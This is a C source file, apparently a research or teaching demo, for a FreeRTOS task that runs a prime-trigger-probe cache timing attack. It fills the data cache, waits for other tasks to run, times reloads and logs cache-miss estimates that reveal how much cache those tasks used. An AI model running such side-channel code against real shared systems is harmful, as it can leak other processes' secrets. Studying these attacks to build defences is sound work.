/*
 * CacheTimingAttackDemoTask.c
 *      Author: CY
 */

#include "CacheTimingAttackFunctions.h"
#include "CacheTimingAttackDemoTask.h"

/*****************************************************************************/
/**
* Cache timing attack task (A FreeRTOS task function)
* Monitor cache usage of other tasks by utilizing prime-trigger-probe method.
* What we get from this task is a series of cache miss estimates stored in the system log.
*
* @param	None
*
* @return	None
*
* @note		Cache miss estimates are recorded by calling feedLog(getTaskId(), u32CacheMissEstimateAverage, "H");.
*
******************************************************************************/
u32 cacheAttackBufferArray[SIZE_OF_CACHE_ATTACK_ARRAY];	// Too big to fit the stack size limit of a FreeRTOS task.
static void prvCacheAttackTask( void *pvParameters ){
	u32 u32BufferAccessTime;	// To store the total access time of the buffer.
	u32 u32CacheMissEstimate;	// The unit is CPU cycles (ticks).
	u32 u32CacheUsageSampleCount;
	u32 u32SumOfCacheMissEstimate;	// It is used for averaging sampled cache miss estimates.
	u32 u32CacheMissEstimateAverage;	// The average of u32SumOfCacheMissEstimate. The unit is CPU cycles (ticks).

	u32CacheUsageSampleCount = 0;
	u32SumOfCacheMissEstimate = 0;
	while (1) {
		/* "Prime" step:
		 * 		Fill the data cache with attacker's data. */
		vDataCacheFlush();
		getTimeLoadLineIntArrayRange(cacheAttackBufferArray, Line_OF_CACHE_ATTACK_ARRAY);

		// "Trigger": Delay some time to let the victim use memory.
		vTaskDelay( CACHE_ATTACK_TASK_DELAY_TIME_MS );

		// "Probe": Read the buffer again and compute cache-miss amount.
		u32BufferAccessTime = getTimeLoadLineIntArrayRange(cacheAttackBufferArray, Line_OF_CACHE_ATTACK_ARRAY);

		// H+M=512000/32 lines = 16000 lines
		// H = 16000 - M
		// Ch*H + Cm*M = u32TimeDiff
		// 50*H + 77*M = u32TimeDiff
		// Thus, 50*(16000-M) + 77*M = u32BufferAccessTime
		//       27M = u32BufferAccessTime - 50*16000
		//	       M = u32BufferAccessTime/27 - 22500
		u32CacheMissEstimate = (u32BufferAccessTime/(C_M_LINE-C_H_LINE)) - C_H_LINE*Line_OF_CACHE_ATTACK_ARRAY/(C_M_LINE-C_H_LINE);

		u32SumOfCacheMissEstimate += u32CacheMissEstimate;
		u32CacheUsageSampleCount++;

		// Average sampled cache-miss estimates.
		if (u32CacheUsageSampleCount >= CACHE_ATTACK_TASK_AVERAGE_TIMES) {
			u32CacheMissEstimateAverage = u32SumOfCacheMissEstimate/CACHE_ATTACK_TASK_AVERAGE_TIMES;
			feedLog(getTaskId(), u32CacheMissEstimateAverage, "H");

			// Hint: How to use u32CacheMissEstimateAverage:
			// 		[cycles of 512kB miss] - u32CacheMissEstimateAverage = [time of X-Byte hit]
			// 		[time of X-Byte hit] / [time of 1-Byte hit] = [Y-Byte used by others]

			// Reset variables for the next cycle.
			u32CacheUsageSampleCount = 0;
			u32SumOfCacheMissEstimate = 0;
		}

	}
}

